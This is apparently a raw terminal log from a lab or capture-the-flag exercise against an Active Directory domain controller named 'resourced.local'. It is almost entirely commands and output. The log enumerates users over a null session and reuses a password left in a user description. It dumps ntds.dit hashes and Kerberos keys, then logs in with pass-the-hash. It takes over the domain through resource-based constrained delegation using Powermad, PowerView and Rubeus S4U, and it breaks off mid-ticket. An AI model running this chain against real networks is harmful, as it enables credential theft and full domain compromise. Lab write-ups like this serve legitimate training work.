PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-04 13:59:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-04T14:01:01+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2026-08-03T13:55:51
|_Not valid after:  2027-02-02T13:55:51
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-04T14:00:21+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC

└─$ netexec smb 192.168.112.175  --users              
SMB         192.168.112.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.112.175 445    RESOURCEDC       -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         192.168.112.175 445    RESOURCEDC       Administrator                 2022-02-11 17:21:20 0       Built-in account for administering the computer/domain 
SMB         192.168.112.175 445    RESOURCEDC       Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         192.168.112.175 445    RESOURCEDC       krbtgt                        2021-10-01 11:08:53 0       Key Distribution Center Service Account 
SMB         192.168.112.175 445    RESOURCEDC       M.Mason                       2021-10-01 11:14:51 0       Ex IT admin 
SMB         192.168.112.175 445    RESOURCEDC       K.Keen                        2021-10-01 11:14:51 0       Frontend Developer 
SMB         192.168.112.175 445    RESOURCEDC       L.Livingstone                 2021-10-01 11:14:51 0       SysAdmin 
SMB         192.168.112.175 445    RESOURCEDC       J.Johnson                     2021-10-01 11:14:52 0       Networking specialist 
SMB         192.168.112.175 445    RESOURCEDC       V.Ventz                       2021-10-01 11:14:52 0       New-hired, reminder: HotelCalifornia194! 
SMB         192.168.112.175 445    RESOURCEDC       S.Swanson                     2021-10-01 11:14:52 0       Military Vet now cybersecurity specialist 
SMB         192.168.112.175 445    RESOURCEDC       P.Parker                      2021-10-01 11:14:52 0       Backend Developer 
SMB         192.168.112.175 445    RESOURCEDC       R.Robinson                    2021-10-01 11:14:52 0       Database Admin 
SMB         192.168.112.175 445    RESOURCEDC       D.Durant                      2021-10-01 11:14:52 0       Linear Algebra and crypto god 
SMB         192.168.112.175 445    RESOURCEDC       G.Goldberg                    2021-10-01 11:14:52 0       Blockchain expert 
SMB         192.168.112.175 445    RESOURCEDC       [*] Enumerated 13 local users: resourced

└─$ rpcclient -U "" -N resourced.local -c "enumdomusers"
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[M.Mason] rid:[0x44f]
user:[K.Keen] rid:[0x450]
user:[L.Livingstone] rid:[0x451]
user:[J.Johnson] rid:[0x452]
user:[V.Ventz] rid:[0x453]
user:[S.Swanson] rid:[0x454]
user:[P.Parker] rid:[0x455]
user:[R.Robinson] rid:[0x456]
user:[D.Durant] rid:[0x457]
user:[G.Goldberg] rid:[0x458]


┌──(ed㉿kali)-[~]
└─$ rpcclient -U "" -N resourced.local -c "enumdomgroups"
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]


└─$ ldapsearch -x -H ldap://192.168.112.175 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=resourced,DC=local
namingcontexts: CN=Configuration,DC=resourced,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=resourced,DC=local
namingcontexts: DC=DomainDnsZones,DC=resourced,DC=local
namingcontexts: DC=ForestDnsZones,DC=resourced,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1


getADUsers
└─$ impacket-GetNPUsers resourced.local/ -dc-ip 192.168.112.175 -usersfile user.txt -format hashcat -outputfile hash.txt
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] User M.Mason doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User K.Keen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Livingstone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User J.Johnson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User V.Ventz doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User S.Swanson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Parker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User D.Durant doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Goldberg doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set


SMB        V.Ventz     New-hired, reminder: HotelCalifornia194! 

└─$ netexec smb 192.168.112.175  -u V.Ventz -p 'HotelCalifornia194!' --shares
SMB         192.168.112.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.112.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.112.175 445    RESOURCEDC       [*] Enumerated shares
SMB         192.168.112.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.112.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.112.175 445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.112.175 445    RESOURCEDC       C$                              Default share
SMB         192.168.112.175 445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.112.175 445    RESOURCEDC       NETLOGON        READ            Logon server share 
SMB         192.168.112.175 445    RESOURCEDC       Password Audit  READ            
SMB         192.168.112.175 445    RESOURCEDC       SYSVOL          READ            Logon server share 

└─$ smbclient //192.168.112.175/Password\ Audit  --user=V.Ventz --password='HotelCalifornia194!'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  Active Directory                    D        0  Tue Oct  5 04:49:15 2021
  registry                            D        0  Tue Oct  5 04:49:16 2021

mget all files - hive files

└─$ impacket-secretsdump -system SYSTEM -security SECURITY LOCAL -ntds ntds.dit  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RESOURCED\RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCED\RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCED\RESOURCEDC$:des-cbc-md5:857c8925d602d645
RESOURCED\RESOURCEDC$:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
RESOURCED\RESOURCEDC$:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
[*] NL$KM 
 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.>.J......I.
 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004resourced.localb16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673



now we can pass the hash to winrm login

└─$ cat all          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
                                                                                                    
┌──(ed㉿kali)-[/tmp]
└─$ cat all | awk -F ':' '{print $1 ":" $4}' > m
                                                                                                    
┌──(ed㉿kali)-[/tmp]
└─$ cat ,                                       
cat: ,: No such file or directory
                                                                                                    
┌──(ed㉿kali)-[/tmp]
└─$ cat m
Administrator:12579b1666d4ac10f0f59f300776495f
Guest:31d6cfe0d16ae931b73c59d7e0c089c0
RESOURCEDC$:9ddb6f4d9d01fedeb4bccfb09df1b39d
krbtgt:3004b16f88664fbebfcb9ed272b0565b
M.Mason:3105e0f6af52aba8e11d19f27e487e45
K.Keen:204410cc5a7147cd52a04ddae6754b0c
L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
J.Johnson:3e028552b946cc4f282b72879f63b726
V.Ventz:913c144caea1c0a936fd1ccb46929d3c
S.Swanson:bd7c11a9021d2708eda561984f3c8939
P.Parker:980910b8fc2e4fe9d482123301dd19fe
R.Robinson:fea5a148c14cf51590456b2102b29fac
D.Durant:08aca8ed17a9eec9fac4acdcb4652c35
G.Goldberg:62e16d17c3015c47b4d513e65ca757a2


└─$ netexec smb 192.168.112.175  -u M.Mason -H 3105e0f6af52aba8e11d19f27e487e45
SMB         192.168.112.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.112.175 445    RESOURCEDC       [-] resourced.local\M.Mason:3105e0f6af52aba8e11d19f27e487e45 STATUS_PASSWORD_EXPIRED

netexec smb 192.168.112.175  -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808

└─$ netexec smb 192.168.112.175  -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
SMB         192.168.112.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.112.175 445    RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 


└─$ evil-winrm -i  192.168.112.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
                                        1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami
resourced\l.livingstone

└─$ bloodhound-python -ns 192.168.112.175 -d resourced.local -u L.Livingstone --hashes 'aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808' -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: resourced.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: resourcedc.resourced.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: resourcedc.resourced.local
INFO: Found 14 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: ResourceDC.resourced.local
INFO: Done in 00M 20S
INFO: Compressing output into 20260804113340_bloodhound.zip






L.Livingstone  genericAll to computer RESOURCEDC.RESOURCED.LOCAL


https://github.com/kevin-robertson/powermad

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> upload Powermad.ps1

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> . .\Powermad.ps1

New-MachineAccount -MachineAccount mysys -Password $(ConvertTo-SecureString 'QWEqwe123!' -AsPlainText -Force)
[+] Machine account mysys added


*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-ADComputer -Filter * | Select-Object Name, DNSHostName, Enabled, OperatingSystem

Name       DNSHostName                Enabled OperatingSystem
----       -----------                ------- ---------------
RESOURCEDC ResourceDC.resourced.local    True
mysys      mysys.resourced.local         True


*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> upload PowerView.ps1

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> . .\PowerView.ps1

$ComputerSid = Get-DomainComputer mysys -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer RESOURCEDC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}


*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> upload Rubeus.exe

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\Rubeus.exe hash /password:QWEqwe123!

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Calculate Password Hash(es)

[*] Input password             : QWEqwe123!
[*]       rc4_hmac             : 3AB68D9A50741FB91E89B1E0299247A4

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!

Rubeus.exe s4u /user:mysys$ /rc4:3AB68D9A50741FB91E89B1E0299247A4 /impersonateuser:admin /msdsspn:cifs/dc.resourced.local /ptt


*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\Rubeus.exe s4u /user:mysys$ /rc4:3AB68D9A50741FB91E89B1E0299247A4 /impersonateuser:Administrator /msdsspn:cifs/ResourceDC.resourced.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: S4U

[*] Using rc4_hmac hash: 3AB68D9A50741FB91E89B1E0299247A4
[*] Building AS-REQ (w/ preauth) for: 'resourced.local\mysys$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFCDCCBQSgAwIBBaEDAgEWooIEFjCCBBJhggQOMIIECqADAgEFoREbD1JFU09VUkNFRC5MT0NBTKIk
      MCKgAwIBAqEbMBkbBmtyYnRndBsPcmVzb3VyY2VkLmxvY2Fso4IDyDCCA8SgAwIBEqEDAgECooIDtgSC
      A7KWDnrVltxi7+h9P0hxibrHFsOIE/QnPK4BBmX9U+yHDZpNGPknic2WK2oNeOQ81EjjUU07Pr4IDma6
      f7q9KLbYdmXB73Bc4QLsIzi82Ya75IIa0xY/XqSbN6w7XhL3WKScYIHXlbfEK1d3+ZpHUZx6Ajvmkwrp
      QNL4uMLHFU9Eefi8UC6UwBggni/ZJ3inQLIKpfBBUqeld7U9hc2oM6ZDs/MnaursBjJ11oom6p52rBh8
      NkTIlCG5kE+2C8jmXYtqMZY7iRzPZGUO4sgQyur5BRinpAunhrx04GoDvUPEAevZoDNaaBO4x+vdyBGg
      Q65HYY/8Yg7j3Uz+KSJFjuEXJ59t4j4+tJRVWArORDU8L+K8xl2UzSjuYzef6AwRT8LWzICSLuI0FrZv
      hPWOlCaCIh/7lYHw6glXzshyDbfPnD2/68SCDMFLuu6cwVg8KeoBXCHPPUegCYx/60Yuo/QzXu7RTbj0
      w42p/QtGx+33edwTvu5owXwWQtsKO38RxVDarMf6dxYVUDGl/gcmQ5okfilVqoxyS7Wu/iPjC1+XOPmJ
      aBFvVShBvBi3FunTIPveSz6/qlab4lMrhHdmVFCY2VmZbfJ60ZKQmLGBnF9bkGhWHB8fd/rBSOD65Fy3
      TtUVP+65m0PWpu7SDREM1QFYh58gwOl0UwVfF48JgXeQwGfYu2NCNrhqKFy8KjOQZQRee1JBPoYj0AVC
      9SWoVAJ04wgNhpgfazE8DrT4JRpRw2Q+JYAhES0wEJCVAjh9uzg84/5nAyqgbUgQWb6BSniT/wSkquRA
      HwaW2e981FCOAtXfxPdnWz5YWEnD2mUP6q+gQXQmbpBjUM4xB84fq1yx/7g0bjWQh2+v1mwuR6xeVPBp
      1quKXFSyq4lsUXJEoVSIc8uw2WAE2LdNM+aO6NP2F184e2rBxR+gzo+ibTon34GwHN9n3em+CDHnLA2i
      AsznOQv+slMjqVIRD7wfq3rB16vlUidPkHm0JopjFw3kOKzJM5sH2webUJhar5JdV/eUy8xLYocDpSRX
      CSITxPq9P6PdIz4oYIjdg7NC+h2SDOphGFAsO0ol/u/cEifgTn1SRiS0KYceVE8VqNKCdLbkptIUg088
      QLBlmeqAgy6POfECfos4aa6t24wwr7CnbgNQgt3gYY+rSYlrMJDkueD6iplyCdmpIfdDch/wHzb7DHCX
      P3j+KyeckqrOJE+q5xmrdfpsXx890G9N+yk38Tu05BNH0HFzSLltsM48A3BImFl7o4HdMIHaoAMCAQCi
      gdIEgc99gcwwgcmggcYwgcMwgcCgGzAZoAMCARehEgQQEx8LPXZwrh8qbHHlRUetiaERGw9SRVNPVVJD
      RUQuTE9DQUyiEzARoAMCAQGhCjAIGwZteXN5cySjBwMFAEDhAAClERgPMjAyNjA4MDUwOTQ2MzNaphEY
      DzIwMjYwODA1MTk0NjMzWqcRGA8yMDI2MDgxMjA5NDYzM1qoERsPUkVTT1VSQ0VELkxPQ0FMqSQwIqAD
      AgECoRswGRsGa3JidGd0Gw9yZXNvdXJjZWQubG9jYWw=


[*] Action: S4U

[*] Using domain controller: ResourceDC.resourced.local (::1)
[*] Building S4U2self request for: 'mysys$@RESOURCED.LOCAL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'mysys$@RESOURCED.LOCAL'
[*] base64(ticket.kirbi):

      doIFkDCCBYygAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoREbD1JFU09VUkNFRC5MT0NBTKIT
      MBGgAwIBAaEKMAgbBm15c3lzJKOCBGswggRnoAMCARehAwIBAaKCBFkEggRVaHagAjDTOE/gm7ixrDc7
      cecS7n5Uip3loXSYk8fsffDS8K/QOpbDC43Iunep+ETf6b7rgGjd9DD7cUZoGZl6zrOSdi1xtAlXmDbG
      qONDFjXH7fyR89o04tAhScLHCWIM3sDjSs6cmi8/IUFy+gFywNlf8bHex1MutzmrpJ/wK6pU059LFstB
      1A+/x0Maf43z9f0HuhBxlu2PYyWntoCpxB/W74LwuttHDk+Kyq5jCKV42p3nA0iUrn9cysrfJu9FlFCm
      xXFnmaSeXfhP32UtCVnWsxn00SG258zSq941mOeUkMSC9h2nqZuEwXPr4fwRAqzIDnjONrSs9LWjR2D6
      LwUtgPmy4DNfNR7dZ95WLbUFwodyJkik/BWG+vK8qmrmI5rF2qTAOUxU5SK9LI69kuDCMxkgDMPp063T
      GLi9SF/KLdOeo1P3kfqaM5ld8oPU+tcy08PQhUwdxMr/pEt+e+ltjuVVo0W3RlXVDijufx2jV1H9fS5f
      XZQBVmAuIMBNMAAH5AVA4VBiSxvJeXb0iEDX9POpQ8iYHueUTTF23JkquOM6DjdNoPBlIo/epNRR2PZB
      1LsUf8hBEpvyNTrAeKsE87v8nuSm09TKYMt1dhwBpUswPCWpovRUwp9J+Cpwx9jALlygqU4jnKRrswE3
      rEU6BBTJgRpJM42LkCA39xgV9EWHfVZ+8rQhIvXmFLy1ouIYMwcopj/bcNn2xqoUEWPiHvEJQgAjdVYz
      4Z9BY1AgWqKXOMuX82vjZBYPIyZuUZu/ppjIeoZFTut5FSYqi40mZPX93rYuqIxPcjvV1ENgjLz+qsIs
      qFXqEXIDrRCQoE5aa8u/RjoKLAwF6n/cbrj8dNbXr6QvM/r7FCl64NdNuMi8YsSGmYRqcRgF6iZtW8Dm
      BGpM63Wtj6yA3DfUoC2ybwnrJJ9zrTx77ObB2SkpJnZtgOuBSBt+cOhYaArVilMfQF1mlX5g253cVY8e
      MpEVVf5K9v/tAl2/Zn4BUQWtLRLtZI2WK1LjdPWsdQRtvfnMHFHxQgNK1NNeepdnosv+3jehZOt7WcTG
